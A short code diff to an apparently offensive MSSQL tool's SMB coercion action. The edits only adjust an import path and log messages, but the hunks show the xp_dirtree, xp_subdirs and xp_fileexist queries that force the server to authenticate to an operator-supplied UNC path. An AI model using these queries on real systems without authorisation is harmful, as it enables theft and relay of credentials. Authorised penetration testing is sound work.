@@ -10,7 +10,7 @@ from loguru import logger
 # Local library imports
 from ..base import BaseAction, Arg
 from ..factory import ActionFactory
-from ...services.database import DatabaseContext
+from services.database import DatabaseContext
 
 
 @ActionFactory.register(
@@ -90,7 +90,7 @@ class SmbCoerce(BaseAction):
             True if successful, False otherwise
         """
         try:
-            logger.info("Trying xp_dirtree method...")
+            logger.info("Trying xp_dirtree method")
 
             query = f"EXEC master..xp_dirtree '{self._unc_path}';"
             database_context.query_service.execute(query)
@@ -112,7 +112,7 @@ class SmbCoerce(BaseAction):
             True if successful, False otherwise
         """
         try:
-            logger.info("Trying xp_subdirs method...")
+            logger.info("Trying xp_subdirs method")
 
             query = f"EXEC master..xp_subdirs '{self._unc_path}';"
             database_context.query_service.execute(query)
@@ -134,7 +134,7 @@ class SmbCoerce(BaseAction):
             True if successful, False otherwise
         """
         try:
-            logger.info("Trying xp_fileexist method...")
+            logger.info("Trying xp_fileexist method")
 
             # xp_fileexist requires a file path, append a file
             file_path = self._unc_path.rstrip("\\") + "\\data.txt"
